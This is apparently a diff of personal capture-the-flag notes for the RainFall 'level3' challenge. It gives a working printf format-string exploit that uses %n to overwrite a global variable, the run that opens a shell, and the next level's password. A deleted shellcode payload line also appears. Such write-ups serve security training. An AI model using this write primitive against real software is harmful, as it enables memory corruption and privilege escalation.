@@ -1,7 +1,8 @@
 Infos:
-info variable => m (0x0804988c)
+info variable => m (0x0804988c) (global variables)
 info function
 objdump -s level3
+x/s for printing strings
 
 We use the string formatting as security breach
 1- find the address of our input
@@ -10,9 +11,6 @@ Index 4
 AAAA41414141
 
 Offset = 4
-
-3- payload:
-python -c 'print "AAAA" + "\x90" * 34 + "\x6a\x31\x58\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\x31\xc0\x50\x68\x2f\x2f" + "%4$x"'
 
 2- GDB:
 
@@ -29,8 +27,8 @@ Dump of assembler code for function v:
    0x080484cc <+40>:	lea    -0x208(%ebp),%eax
    0x080484d2 <+46>:	mov    %eax,(%esp)
    0x080484d5 <+49>:	call   0x8048390 <printf@plt>
-   0x080484da <+54>:	mov    0x804988c,%eax
-   0x080484df <+59>:	cmp    $0x40,%eax
+   0x080484da <+54>:	mov    0x804988c,%eax      | we have to manipulate the value the global variable m and we have to put 64 as value to m 
+   0x080484df <+59>:	cmp    $0x40,%eax          | in order to execute fwrite and system functions
    0x080484e2 <+62>:	jne    0x8048518 <v+116>
    0x080484e4 <+64>:	mov    0x8049880,%eax
    0x080484e9 <+69>:	mov    %eax,%edx
@@ -43,5 +41,13 @@ Dump of assembler code for function v:
    0x0804850c <+104>:	movl   $0x804860d,(%esp)
    0x08048513 <+111>:	call   0x80483c0 <system@plt>
    0x08048518 <+116>:	leave
-   0x08048519 <+117>:	ret <= this address is interesting
-End of assembler dump.  
+   0x08048519 <+117>:	ret
+End of assembler dump.
+
+3- we have use the formater %n of printf because it writes the number of cha0racters to be printed, so we have to put 64 characters
+python -c "print('\x8c\x98\x04\x08' + 60 * 'A' + '%4\$n')" > /tmp/test
+level3@RainFall:~$ cat /tmp/test - | ./level3
+�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Wait what?!
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
